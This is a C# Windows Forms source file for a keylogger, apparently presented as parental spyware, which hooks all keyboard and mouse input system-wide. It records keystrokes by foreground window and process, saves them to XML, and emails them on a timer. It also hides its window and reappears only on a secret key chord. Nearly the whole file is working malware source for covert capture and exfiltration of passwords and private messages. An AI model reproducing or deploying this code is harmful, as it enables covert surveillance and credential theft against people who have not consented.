// --------------------------------------------------------------------------------------------------------------------
// <copyright file="frmMain.cs" company="Nonoe">
//   
// </copyright>
// <summary>
//   The frm main.
// </summary>
// --------------------------------------------------------------------------------------------------------------------

namespace KeyLogger
{
    using System;
    using System.Collections;
    using System.Diagnostics;
    using System.Globalization;
    using System.IO;
    using System.Net;
    using System.Net.Mail;
    using System.Threading;
    using System.Windows.Forms;

    using Nonoe.ParentalSpyware.Core.Utils;

    /// <summary>
    /// The main form.
    /// </summary>
    public partial class FrmMain : Form
    {
        #region Fields

        /// <summary>
        /// The _option.
        /// </summary>
        private readonly Frmoptions option;

        /// <summary>
        /// The allow to tick.
        /// </summary>
        private bool allowToTick;

        /// <summary>
        /// The application names.
        /// </summary>
        private Stack appNames;

        /// <summary>
        /// The email parameters.
        /// </summary>
        private Params emailParams;

        /// <summary>
        /// The hooker.
        /// </summary>
        private UserActivityHook hooker;

        /// <summary>
        /// The is alt down.
        /// </summary>
        private bool isAltDown;

        /// <summary>
        /// The is control down.
        /// </summary>
        private bool isControlDown;

        /// <summary>
        /// The is emailer on.
        /// </summary>
        private bool isEmailerOn;

        /// <summary>
        /// The is function keys down.
        /// </summary>
        private bool isFsDown;

        /// <summary>
        /// The is hide.
        /// </summary>
        private bool isHide;

        /// <summary>
        /// The is logger on.
        /// </summary>
        private bool isLoggerOn;

        /// <summary>
        /// The is shift down.
        /// </summary>
        private bool isShiftDown;

        /// <summary>
        /// The log data.
        /// </summary>
        private Hashtable logData;

        /// <summary>
        /// The log file path.
        /// </summary>
        private string logFilePath = Application.StartupPath + @"\Acitivitylog.xml";

        /// <summary>
        /// The tick.
        /// </summary>
        private int tick;

        #endregion

        #region Constructors and Destructors

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmMain"/> class.
        /// </summary>
        public FrmMain()
        {
            this.InitializeComponent();
            this.option = new Frmoptions();
        }

        #endregion

        #region Public Methods and Operators

        /// <summary>
        /// The send mail.
        /// </summary>
        /// <param name="data">
        /// The data.
        /// </param>
        public static void SendMail(object data)
        {
            try
            {
                string mailaddress = ((Params)data).Mailaddress;
                string smtpHost = ((Params)data).SmtpHost;
                int smtpPort = ((Params)data).SmtpPort;
                string mailpassword = ((Params)data).Mailpassword;
                string logstr = ((Params)data).Logstr;
                bool sslstate = ((Params)data).EnableSsl;

                var fromAddress = new MailAddress(mailaddress, "CSKeylogger");
                var toAddress = new MailAddress(mailaddress, "CSKeylogger");
                const string Subject = "Key logger Log file !";
                var smtp = new SmtpClient
                               {
                                   Host = smtpHost, 
                                   Port = smtpPort, 
                                   EnableSsl = sslstate, 
                                   DeliveryMethod = SmtpDeliveryMethod.Network, 
                                   UseDefaultCredentials = false, 
                                   Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                               };
                using (var message = new MailMessage(fromAddress, toAddress) { Subject = Subject, Body = logstr, })
                {
                    smtp.Send(message);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        /// <summary>
        /// The hooker key down.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The key event argument.</param>
        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
            {
                this.Logger("[Enter]");
            }

            if (e.KeyData.ToString() == "Escape")
            {
                this.Logger("[Escape]");
            }

            // Logger(e.KeyData + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    this.isAltDown = true;
                    break;
                case "RControlKey":
                case "LControlKey":
                    this.isControlDown = true;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    this.isShiftDown = true;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    this.isFsDown = true;
                    break;
            }

            if (!this.isAltDown || !this.isControlDown || !this.isShiftDown || !this.isFsDown)
            {
                return;
            }

            if (this.isHide)
            {
                this.Show();
                this.isHide = false;
            }
            else
            {
                this.Hide();
                this.isHide = true;
            }
        }

        /// <summary>
        /// The hooker key press.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            this.allowToTick = true;
            if ((byte)e.KeyChar == 9)
            {
                this.Logger("[TAB]");
            }
            else if (char.IsLetterOrDigit(e.KeyChar) || char.IsPunctuation(e.KeyChar))
            {
                this.Logger(e.KeyChar.ToString(CultureInfo.InvariantCulture));
            }
            else if (e.KeyChar == 32)
            {
                this.Logger(" ");
            }
            else if (e.KeyChar != 27 && e.KeyChar != 13)
            {
                // Escape
                this.Logger("[Char\\" + ((byte)e.KeyChar) + "]");
            }

            this.tick = 0;
        }

        /// <summary>
        /// The hooker key up.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        public void HookerKeyUp(object sender, KeyEventArgs e)
        {
            // Logger("KeyUP : " + e.KeyData.ToString() + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    this.isAltDown = false;
                    break;
                case "RControlKey":
                case "LControlKey":
                    this.isControlDown = false;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    this.isShiftDown = false;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    this.isFsDown = false;
                    break;
            }
        }

        /// <summary>
        /// The mouse moved.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        public void MouseMoved(object sender, MouseEventArgs e)
        {
            this.labelMousePosition.Text = string.Format("X:{0},Y={1},Wheel:{2}", e.X, e.Y, e.Delta);
            if (e.Clicks <= 0)
            {
                return;
            }

            this.txt_MouseLog.AppendText("MouseButton:" + e.Button);
            this.txt_MouseLog.AppendText(Environment.NewLine);
        }

        #endregion

        #region Methods

        /// <summary>
        /// The exit button click event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void BtnExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /// <summary>
        /// The hide button click event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument. </param>
        private void BtnHideClick(object sender, EventArgs e)
        {
            this.Hide();
            this.hooker.Start();
            this.isHide = true;
        }

        /// <summary>
        /// The button start click.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void ButtonStartClick(object sender, EventArgs e)
        {
            if (!this.hooker.IsActive)
            {
                this.hooker.Start();
                if (this.isEmailerOn)
                {
                    this.timer_emailer.Enabled = true;
                }

                if (this.isLoggerOn)
                {
                    this.timer_logsaver.Enabled = true;
                }
            }
        }

        /// <summary>
        /// The button stop click.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void ButtonStopClick(object sender, EventArgs e)
        {
            if (this.hooker.IsActive)
            {
                this.hooker.Stop();
                this.timer_emailer.Enabled = false;
                this.timer_logsaver.Enabled = false;
            }
        }

        /// <summary>
        /// The log generation.
        /// </summary>
        /// <returns>The log</returns>
        private string Generatelog()
        {
            try
            {
                string logdata = string.Format("CS Key logger Log Data{0}", Environment.NewLine);

                IDictionaryEnumerator element = this.logData.GetEnumerator();
                while (element.MoveNext())
                {
                    string processname =
                        element.Key.ToString()
                               .Trim()
                               .Substring(0, element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal))
                               .Trim();
                    string applname =
                        element.Key.ToString()
                               .Trim()
                               .Substring(element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal) + 6)
                               .Trim();
                    string ldata = element.Value.ToString().Trim();

                    if (applname.Length >= 25 || processname.Length >= 25)
                    {
                        continue;
                    }

                    logdata += applname.PadRight(25, '-');
                    logdata += processname.PadLeft(25, '-');
                    logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
                    logdata += ldata + Environment.NewLine + Environment.NewLine;
                }

                logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine
                           + string.Format("LOG FILE, Data {0}", DateTime.Now.ToString(CultureInfo.InvariantCulture));
                return logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }

            return null;
        }

        /// <summary>
        /// The logger.
        /// </summary>
        /// <param name="txt">The text.</param>
        private void Logger(string txt)
        {
            this.txt_Log.AppendText(txt);
            this.txt_Log.SelectionStart = this.txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string appName = p.ProcessName;
                string appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", string.Empty);
                string thisapplication = appltitle + "######" + appName;
                if (!this.appNames.Contains(thisapplication))
                {
                    this.appNames.Push(thisapplication);
                    this.logData.Add(thisapplication, string.Empty);
                }

                IDictionaryEnumerator en = this.logData.GetEnumerator();
                while (en.MoveNext())
                {
                    if (en.Key.ToString() != thisapplication)
                    {
                        continue;
                    }

                    string prlogdata = en.Value.ToString();
                    this.logData.Remove(thisapplication);
                    this.logData.Add(thisapplication, prlogdata + " " + txt);
                    break;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }

        /// <summary>
        /// The main form load.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void MainFormLoad(object sender, EventArgs e)
        {
            this.hooker = new UserActivityHook();
            this.hooker.OnMouseActivity += this.MouseMoved;
            this.hooker.KeyDown += this.HookerKeyDown;
            this.hooker.KeyPress += this.HookerKeyPress;
            this.hooker.KeyUp += this.HookerKeyUp;
            this.hooker.Stop();

            this.appNames = new Stack();
            this.logData = new Hashtable();
        }

        /// <summary>
        /// The about menu item click event handler
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void MnuItemAboutClick(object sender, EventArgs e)
        {
            var about = new frmAbout { TopMost = true };
            about.ShowDialog();
        }

        /// <summary>
        /// The exit menu item click event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void MnuItemExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /// <summary>
        /// The hide menu item click event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void MnuItemHideClick(object sender, EventArgs e)
        {
            this.Hide();
            this.hooker.Start();
            this.isHide = true;
        }

        /// <summary>
        /// The save menu item click event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void MnuItemSaveClick(object sender, EventArgs e)
        {
            var savef = new SaveFileDialog
                            {
                                Title = "Save ...", 
                                Filter = "CSKeylogger log files (*.xml)|*.xml", 
                                FileName = "Logfile.xml"
                            };
            if (savef.ShowDialog() == DialogResult.OK)
            {
                this.SaveLogfile(savef.FileName);
            }
        }

        // End Menu Events

        /// <summary>
        /// The save log file method.
        /// </summary>
        /// <param name="pathtosave">Where to save the log file.</param>
        private void SaveLogfile(string pathtosave)
        {
            try
            {
                string xlspath = this.logFilePath.Substring(0, this.logFilePath.LastIndexOf("\\", StringComparison.Ordinal) + 1)
                                 + "ApplogXSL.xsl";
                if (!File.Exists(xlspath))
                {
                    File.Create(xlspath).Close();
                    const string Xslcontents = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                    var xslwriter = new StreamWriter(xlspath);
                    xslwriter.Write(Xslcontents);
                    xslwriter.Flush();
                    xslwriter.Close();
                }

                var writer = new StreamWriter(pathtosave, false);
                IDictionaryEnumerator element = this.logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine(string.Empty);
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine(string.Empty);
                writer.Write("<ApplDetails>");

                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA["
                                         + element.Key.ToString()
                                                  .Trim()
                                                  .Substring(0, element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal))
                                                  .Trim() + "]]>";
                    processname = processname.Replace("\0", string.Empty);
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA["
                                      + element.Key.ToString()
                                               .Trim()
                                               .Substring(element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal) + 6)
                                               .Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");
                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + element.Value.ToString().Trim() + "]]>").Replace("\0", string.Empty);
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }

                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        /// <summary>
        /// The timer 1 tick.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void Timer1Tick(object sender, EventArgs e)
        {
            if (this.allowToTick)
            {
                this.tick += 1;

                if (this.tick != 20)
                {
                    return;
                }

                this.Logger(Environment.NewLine);
                this.tick = 0;
                this.allowToTick = false;
            }

            if (this.txt_CurrentWindowstitle.Text == this.Text)
            {
                this.txt_CurrentWindowstitle.Text = "Current Window Title";
            }
        }

        /// <summary>
        /// The timer emailer tick.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void TimerEmailerTick(object sender, EventArgs e)
        {
            string logstr = this.Generatelog();
            var parameters = new Params(
                logstr, 
                this.emailParams.Mailaddress, 
                this.emailParams.Mailpassword, 
                this.emailParams.SmtpHost, 
                this.emailParams.SmtpPort, 
                this.emailParams.EnableSsl);
            var mailer = new Thread(SendMail);
            mailer.Start(parameters);
        }

        /// <summary>
        /// The timer log saver tick event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void TimerLogsaverTick(object sender, EventArgs e)
        {
            this.SaveLogfile(this.logFilePath);
        }

        /// <summary>
        /// The settings menu item click event handler.
        /// </summary>
        /// <param name="sender">The sender argument.</param>
        /// <param name="e">The event argument.</param>
        private void MnuItemSettingsClick(object sender, EventArgs e)
        {
            // we don't want log our email password!
            if (this.hooker.IsActive)
            {
                this.hooker.Stop();
            }

            if (this.option.ShowDialog() == DialogResult.OK)
            {
                if (this.option.chk_autoemailer.Checked)
                {
                    this.emailParams = new Params(
                        null, 
                        this.option.txt_emailAddress.Text, 
                        this.option.txt_emailpassword.Text, 
                        this.option.txt_smtpServer.Text, 
                        Convert.ToInt32(this.option.txt_smtpport.Text), 
                        this.option.chk_usessl.Checked);

                    this.timer_emailer.Interval = (int)(this.option.numeric_emailtime.Value * 60000);
                    this.timer_emailer.Enabled = true;
                    this.isEmailerOn = true;
                }
                else
                {
                    this.timer_emailer.Enabled = false;
                    this.isEmailerOn = false;
                }

                if (this.option.chk_autosaver.Checked)
                {
                    if (this.option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
                    {
                        this.logFilePath = this.option.txt_filelocation.Text;
                    }

                    this.timer_logsaver.Interval = (int)(this.option.numeric_savetimer.Value * 60000);
                    this.timer_logsaver.Enabled = true;
                    this.isLoggerOn = true;
                }
                else
                {
                    this.timer_logsaver.Enabled = false;
                    this.isLoggerOn = false;
                }
            }
        }

        #endregion

        /// <summary>
        /// The parameters.
        /// </summary>
        public class Params
        {
            #region Fields

            /// <summary>
            /// The enable SSL.
            /// </summary>
            public bool EnableSsl;

            /// <summary>
            /// The log string.
            /// </summary>
            public string Logstr;

            /// <summary>
            /// The mail address.
            /// </summary>
            public string Mailaddress;

            /// <summary>
            /// The mail password.
            /// </summary>
            public string Mailpassword;

            /// <summary>
            /// The SMTP host.
            /// </summary>
            public string SmtpHost;

            /// <summary>
            /// The smtp port.
            /// </summary>
            public int SmtpPort;

            #endregion

            #region Constructors and Destructors

            /// <summary>
            /// Initializes a new instance of the <see cref="Params"/> class.
            /// </summary>
            /// <param name="logstr">The logstr.</param>
            /// <param name="mailaddress">The mailaddress.</param>
            /// <param name="mailpassword">The mailpassword.</param>
            /// <param name="smtpHost">The smtp host.</param>
            /// <param name="smtpPort">The smtp port.</param>
            /// <param name="enablessl">The enablessl.</param>
            public Params(string logstr, string mailaddress, string mailpassword, string smtpHost, int smtpPort, bool enablessl)
            {
                this.Logstr = logstr;
                this.Mailaddress = mailaddress;
                this.Mailpassword = mailpassword;
                this.SmtpHost = smtpHost;
                this.SmtpPort = smtpPort;
                this.EnableSsl = enablessl;
            }

            #endregion
        }
    }
}